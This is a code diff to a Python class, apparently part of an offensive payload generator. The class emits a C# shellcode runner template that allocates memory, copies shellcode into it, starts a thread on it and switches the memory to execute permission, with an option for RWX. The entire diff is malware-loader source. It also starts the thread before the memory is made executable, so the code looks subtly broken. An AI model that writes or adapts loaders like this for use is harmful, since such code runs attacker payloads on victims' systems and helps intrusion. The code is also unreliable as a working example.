@@ -1,6 +1,11 @@
+from string import Template
+
 class shellcoderunner:
     def __init__(self, arguments):
-        pass
+        self.memoryPermission = '0x20'
+        if 'perm' in arguments:
+            if arguments['perm'] == 'rwx':
+                self.memoryPermission = '0x40'
 
     def imports(self) -> list[str]:
         return ["using System;", 
@@ -18,15 +23,18 @@ class shellcoderunner:
         return ''
 
     def template(self) -> str:
-        return """
+        return Template("""
             {transformers}
             int size = shellcode.Length;
 
-            IntPtr addr = {VirtualAlloc}(IntPtr.Zero, (uint)size, 0x3000, 0x40);
+            IntPtr addr = {VirtualAlloc}(IntPtr.Zero, (ulong)shellcode.Length, 0x3000, 0x04);
 
             Marshal.Copy(shellcode, 0, addr, size);
 
             IntPtr hThread = {CreateThread}(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
 
+            IntPtr oldProtect;
+            {VirtualProtect}(addr, (ulong)shellcode.Length, $memoryPermission, out oldProtect);
+
             {WaitForSingleObject}(hThread, 0xFFFFFFFF);
-"""
+""").substitute(memoryPermission = self.memoryPermission)
